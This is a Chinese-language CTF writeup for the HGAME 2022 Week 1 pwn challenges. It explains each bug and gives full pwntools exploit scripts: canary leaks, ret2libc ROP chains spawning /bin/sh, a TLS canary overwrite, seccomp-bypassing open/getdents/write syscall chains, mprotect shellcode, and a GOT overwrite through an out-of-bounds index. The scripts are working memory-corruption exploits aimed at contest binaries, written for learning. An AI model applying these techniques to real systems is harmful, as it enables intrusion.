---
title: 「PWN」【HGAME 2022 Week1】 Pwn Writeup WP 复现

tags: ['CTF', 'Pwn', 'writeup', 'wp']
authors: [nova]

---

<!--truncate-->

# test_your_nc

这题就是最基本的nc拿flag的过程。

贴一个爆破的方法(我做的时候还没有proof of work)

利用`pwnlib.util.iters`的`mbruteforce`

```python
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() ==
hash_code, charset, 4, method='fixed')
```



# test_your_gdb

gdb查看encrypted_secret，多次尝试发现不变直接绕memcpy就好

exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process('./a.out')
sh = remote('chuj.top', 50610)
elf = ELF('./a.out')
libc = ELF('./libc-2.31.so')


payload = p64(0xB0361E0E8294F147) + p64(0x8c09e0c34ed8a6a9)
gdb.attach(sh, 'b *0x401380')
sh.recvuntil(b'word')
sh.send(payload)
sh.recv()
canary = u64(sh.recv()[24:32])
print(hex(canary))

payload = b'A'*(0x20-0x08) + p64(canary) + b'A'*0x08 + p64(elf.sym['b4ckd00r'])
sh.sendline(payload)
sh.interactive()
```



# enter_the_pwn_land

ret2rop，需要注意的就是它循环的i的值会被修改所以得手工调一下

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process('./a.out')
sh = remote('chuj.top', 31525)
elf = ELF('./a.out')
libc = ELF('./libc-2.31.so')

pop_rdi_ret_addr = 0x0401313
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
test_thread_addr = elf.sym['test_thread']
ret_addr = 0x040101a

# gdb.attach(sh, 'b puts')
sh.send(b'8'*(0x30-0x04)+p32(0x30-0x04))
payload = b'A'*8
payload += p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(test_thread_addr)
sh.sendline(payload)
sh.recvline()
puts_addr = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
sh.send(b'8'*(0x30-0x04)+p32(0x30-0x04))
payload = b'A'*8
payload += p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr) + p64(0)
sh.sendline(payload)
sh.interactive()

```

# enter_the_evil_pwn_land

主要是绕过Canary的过程。

这题想要让我们搞清楚的是，创建线程时会顺便创建一个TLS用于储存诸如canary一类的值，且会用于比较canary是否被修改。这个TLS是存储在Stack高地址的，这意味着我们有一并修改TLS中canary值的机会。



但是值得注意的是，当溢出这么多字节时，势必会对程序本身进行破坏导致crash（修改了诸如tcb, dtv, self等指针），因此我们可以在本地调试时先用gdb调出offset，再直接计算libc_base。

> 看了官方wp之后发现是因为我们修改了dtv指针，而system函数又会调用到这个指针，所以导致程序crash，直接使用execve即可。
>
> 不过，这也算一个不错的计算libc_base的经验

在拿到libc_base之后再进行溢出，即使程序crash，我们也已经进入了system("/bin/sh")，可以成功拿到flag。

exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process('./a.out')
# sh = remote('chuj.top', 38068)
elf = ELF('./a.out')
libc = ELF('./libc-2.31.so')

pop_rdi_ret_addr = 0x401363
test_thread_addr = elf.sym['test_thread']
ret_addr = 0x040101a

offset = 2152  # 2152, 216

payload = b'A'*(0x20)

sh.sendline(payload)
sh.recvline()
b = u64(sh.recvuntil(b'\x0a', drop=True).ljust(8, b'\x00'))
b = str(hex(b)) + '00'
b = int(b, 16)
print(hex(b))

libc_offset = 0x7f7cde389700 - 0x7f7cde38d000
libc_base = b - libc_offset
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

gdb.attach(sh, 'b *0x401363')
payload = b'A'*(0x30-0x08)
payload += p64(0xdeadbeef)
payload += p64(0)
# payload += p64(ret_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr+3)
# payload += p64(ret_addr)
"""payload += p64(0x040135c) + p64(0) + p64(0) + p64(0) + p64(0)
payload += p64(0xe6c7e + libc_base)"""
payload += b'\x00'*(offset-len(payload)) + p64(0xdeadbeef)
sh.sendline(payload)
sh.interactive()
```



# oldfashion_orw

这题挺有意思的。看了题目谷歌之后发现是ORW三件套拿flag

一开始读出字节数将有符号数改成了无符号数，因此填入一个负数即可

但这题给出的sh文件指出我们并不能知道flag文件的名字，因此还需要OGW读文件名（学到了）

同时，这题也有一个坑点，glibc使用的open、read等使用的是`openat`实现的，这恰好是被seccomp禁用的，因此这里需要使用系统调用号实现这些函数



同时，这给我整的很难受的是，我一开始的exp在本地能够读出文件名，远程却没有反应，不知道为什么（）

不知道为什么，总之先贴exp上来

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process('./vuln')
sh = remote('chuj.top', 42614)
elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

pop_rdi_ret = 0x0401443
pop_rsi_r15_ret = 0x0401441
libc_pop_rdx_r12_ret = 0x011c371
libc_pop_rax_ret = 0x04a550
libc_syscall = 0x066229
bss_addr = 0x0404000

write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = elf.sym['main']


def gen_para_payload(para1: bytes, para2: bytes = None, para3: bytes = None) -> bytes:
    payload = b''
    payload += p64(pop_rdi_ret) + para1
    payload += p64(pop_rsi_r15_ret) + para2 + p64(0) if para2 else b''
    payload += p64(pop_rdx_r12_ret) + para3 + p64(0) if para3 else b''
    return payload


payload = b"A"*0x38
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
sh.sendline(payload)
sh.recvuntil(b"done!\n")


write_addr = u64(sh.recv(6).ljust(8, b"\x00"))
print(hex(write_addr))

libc_base = write_addr - libc.sym['write']
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
getdents64_addr = libc_base + libc.sym['getdents64']
pop_rdx_r12_ret = libc_base + libc_pop_rdx_r12_ret
pop_rax_ret = libc_base + libc_pop_rax_ret
syscall = libc_base + libc_syscall

# gdb.attach(sh, 'b write')

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b'a'*0x30 + p64(bss_addr+0x100) + p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15_ret) + p64(bss_addr+0x100) + p64(0)
payload += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
payload += p64(pop_rax_ret) + p64(0)
payload += p64(syscall) + p64(main_addr)
sh.sendline(payload)
sh.recvuntil(b"done!\n")
payload = b'./\x00'
sh.sendline(payload)

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b"A"*0x30 + p64(bss_addr + 0x100)
payload += p64(pop_rax_ret) + p64(0x2)
payload += gen_para_payload(p64(bss_addr + 0x100), p64(0x10000), p64(0))
payload += p64(syscall)

payload += p64(pop_rax_ret) + p64(78)
payload += gen_para_payload(p64(3), p64(bss_addr + 0x100), p64(0x1000))
payload += p64(syscall)

payload += p64(pop_rax_ret) + p64(0x1)
payload += gen_para_payload(p64(1), p64(bss_addr + 0x100), p64(0x1000))
payload += p64(syscall)
payload += p64(main_addr)
sh.sendline(payload)
sh.recvuntil(b"done!\n")
sh.interactive()

```





最后选择了mprotect改权限然后写shellcode

值得一提的是，mark爹ayoung爹他们都是先读了flag名在第二次连接的时候再直接读文件内容的。

我做的时候却是不行的（每一次重新链接flag名字都换了），于是还重新改了改shellcode

exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process('./vuln')
sh = remote('chuj.top', 42614)
elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

pop_rdi_ret = 0x0401443
pop_rsi_r15_ret = 0x0401441
libc_pop_rdx_r12_ret = 0x011c371
libc_pop_rax_ret = 0x04a550
libc_syscall = 0x066229
bss_addr = 0x0404000

write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = elf.sym['main']


def gen_para_payload(para1: bytes, para2: bytes = None, para3: bytes = None) -> bytes:
    payload = b''
    payload += p64(pop_rdi_ret) + para1
    payload += p64(pop_rsi_r15_ret) + para2 + p64(0) if para2 else b''
    payload += p64(pop_rdx_r12_ret) + para3 + p64(0) if para3 else b''
    return payload


payload = b"A"*0x38
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
sh.sendline(payload)
sh.recvuntil(b"done!\n")


write_addr = u64(sh.recv(6).ljust(8, b"\x00"))
print(hex(write_addr))

libc_base = write_addr - libc.sym['write']
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
getdents64_addr = libc_base + libc.sym['getdents64']
mprotect_addr = libc_base + libc.sym['mprotect']
pop_rdx_r12_ret = libc_base + libc_pop_rdx_r12_ret
pop_rax_ret = libc_base + libc_pop_rax_ret
syscall = libc_base + libc_syscall

# gdb.attach(sh, 'b write')

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b"A"*0x30 + p64(bss_addr + 0x100)
payload += gen_para_payload(p64(bss_addr), p64(0x1000), p64(7)) + p64(mprotect_addr) + p64(main_addr)
sh.sendline(payload)
sh.recvuntil(b"done!\n")

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b'a'*0x38 + p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15_ret) + p64(bss_addr + 0x100) + p64(0)
payload += p64(pop_rdx_r12_ret) + p64(0x300) + p64(0)
payload += p64(read_addr) + p64(main_addr)
sh.sendline(payload)
sh.recvuntil(b"done!\n")

shellcode = shellcraft.open("./", 0x10000)
shellcode += shellcraft.getdents("rax", "rsp", 0x1000)
shellcode += shellcraft.write(1, "rsp", 0x1000)
print('payload:\n', shellcode, type(shellcode))
payload = asm(shellcode) + asm(""" mov r14, 0x401311; call r14;""")
sh.sendline(payload)

print(">>> Shellcode on .bss")

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b'a'*0x38
payload += p64(bss_addr + 0x100)
sh.sendline(payload)
sh.recvuntil(b'\x66\x6c\x61\x67')
flag_name = str(sh.recv(20))[2:-1]

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b'a'*0x38 + p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15_ret) + p64(bss_addr + 0x100) + p64(0)
payload += p64(pop_rdx_r12_ret) + p64(0x300) + p64(0)
payload += p64(read_addr) + p64(main_addr)
sh.sendline(payload)
sh.recvuntil(b"done!\n")

payload = shellcraft.open("./flag{}".format(flag_name), 0, 0)
payload += shellcraft.read("rax", "rsp", 100)
payload += shellcraft.write(1, "rsp", 100)
sh.sendline(asm(payload))
sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b'a'*0x38
payload += p64(bss_addr + 0x100)
sh.sendline(payload)
print(sh.recvuntil(b"}"))
sh.interactive()
```



# ser_per_fa

~~在复现了在复现了(新建文件夹)~~

这题作为week1的最后一题，在栈题里应该也算比较高难度了

好好写写（肯定不是因为我只有这题是今天做的）



题目给出了源码，对于我这种OI什么都不知道的傻逼来说还是挺有用处的。

![vulnable](https://cdn.novanoir.moe/img/image-20220212195118394.png)

防护全开，因此我们不仅需要找到libc_base，还需要找到elf_base

通过审计可以发现dist下标可控，因此泄露libc_base和elf_base还是很容易的

```python
s.recvuntil(b'how many nodes?\n>> ')
s.sendline(b'2')
s.recvuntil(b'how many edges?\n>> ')
s.sendline(b'0')
s.recvuntil(b'you want to start from which node?\n>> ')
s.sendline(b'0')
s.recvuntil(b'>> ')
s.sendline(b'-2275')

s.recvuntil(b'the length of the shortest path is ')
elf_base = int(s.recv(15), 10) - 0x7008
success('elf_base=>' + hex(elf_base))

s.recvuntil(b'how many nodes?\n>> ')
s.sendline(b'2')
s.recvuntil(b'how many edges?\n>> ')
s.sendline(b'0')
s.recvuntil(b'you want to start from which node?\n>> ')
s.sendline(b'0')
s.recvuntil(b'>> ')
payload = bytes(str((elf.got['puts'] - elf.sym['dist']) // 8).encode('UTF-8'))
s.sendline(payload)

s.recvuntil(b'the length of the shortest path is ')
libc_base = int(s.recv(15), 10) - libc.sym['puts']
success('libc_base=>' + hex(libc_base))
```

> 这里的-2275和0x7008就是直接观察静态随便找的，但是我也不知道是不是什么默契还是必要，很多人的wp中都选择了这个地址（我换了几个地址似乎也可以哈）

这样即可做到任意地址读了，接下来就得思考如何写。

通过add函数我们是可以做到写的，但是我们还需要知道main函数返回地址在栈上的位置。

这里给出一个[通过environ泄露栈](https://blog.csdn.net/chennbnbnb/article/details/104035261)的方法，也就是说，我们只要泄露出来_environ，即可通过gdb算出距离rbp+8的偏移

这里直接贴上官方exp中的写法:

```python
# get environ (stack addr)
# environ 所在的地址与栈帧中存储 main 函数返回地址的位置的偏移是 0x100
sh.sendlineafter("nodes?\n>> ", str(1))
sh.sendlineafter("edges?\n>> ", str(0))
sh.sendlineafter("node?\n>> ", str(0))
sh.sendlineafter("to ?\n>> ", str((libc_base + 0x1EF2E0 - proc_base -
elf.sym["dist"]) / 8))
sh.recvuntil("path is ")
environ_addr = int(sh.recvuntil("\n", drop = True), base = 10)
log.success("environ_addr: " + hex(environ_addr))
index_to_ret = (environ_addr - 0x100 - (proc_base + elf.sym["dist"])) / 8
sh.sendlineafter("nodes?\n>> ", str(2))
sh.sendlineafter("edges?\n>> ", str(1))
sh.sendlineafter("format\n", "0 " + str(index_to_ret) + " " + str(proc_base +
0x16AA))
```

但事实上，我们也可以通过改写got表的方法做到直接进入后门

> puts中调用了strlen这一函数，而这一函数在libc.so的got.plt表中是可查到的

最后的exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process('./spfa')
elf = ELF('./spfa')
libc = ELF('./libc-2.31.so')

# gdb.attach(sh, 'b puts')
sh.recvuntil(b'how many datas?\n>> ')
sh.sendline(b'4')

sh.recvuntil(b'how many nodes?\n>> ')
sh.sendline(b'2')
sh.recvuntil(b'how many edges?\n>> ')
sh.sendline(b'0')
sh.recvuntil(b'you want to start from which node?\n>> ')
sh.sendline(b'0')
sh.recvuntil(b'>> ')
sh.sendline(b'-2275')

sh.recvuntil(b'the length of the shortest path is ')
elf_base = int(sh.recv(15), 10) - 0x7008
print(hex(elf_base))

sh.recvuntil(b'how many nodes?\n>> ')
sh.sendline(b'2')
sh.recvuntil(b'how many edges?\n>> ')
sh.sendline(b'0')
sh.recvuntil(b'you want to start from which node?\n>> ')
sh.sendline(b'0')
sh.recvuntil(b'>> ')
payload = bytes(str((elf.got['puts'] - elf.sym['dist']) // 8).encode('UTF-8'))
sh.sendline(payload)

sh.recvuntil(b'the length of the shortest path is ')
libc_base = int(sh.recv(15), 10) - libc.sym['puts']
print(hex(libc_base))

strlen_addr = libc_base + 0x1eb0a8
dist_addr = elf_base + elf.sym['dist']
backdoor = elf_base + 0x16A5

sh.recvuntil(b'how many nodes?\n>> ')
sh.sendline(b'2')
sh.recvuntil(b'how many edges?\n>> ')
sh.sendline(b'1')
sh.recvuntil(b'format\n')
sh.sendline(b'1')
sh.sendline(bytes(str((strlen_addr - dist_addr) // 8).encode('UTF-8')))
sh.sendline(bytes(str(backdoor).encode('UTF-8')))
sh.recvuntil(b'you want to start from which node?\n>> ')
sh.sendline(b'1')
sh.recvuntil(b'>> ')
sh.sendline(b'HACKED')
sh.interactive()

```

